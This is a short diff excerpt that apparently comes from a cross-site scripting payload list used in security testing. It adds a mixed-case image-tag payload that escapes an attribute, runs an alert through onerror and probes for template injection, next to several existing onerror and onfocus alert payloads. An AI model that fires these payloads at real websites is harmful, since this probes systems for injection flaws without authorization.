@@ -60,6 +60,7 @@
 <img>
 <img src=1 onerror=alert(1)>
 <img src=x onerror=alert(123) />
+'"><iMg SrC=x OnErRoR=alert(1)>{{7*7}}
 
 <input>
 <input onfocus="alert('xss');">
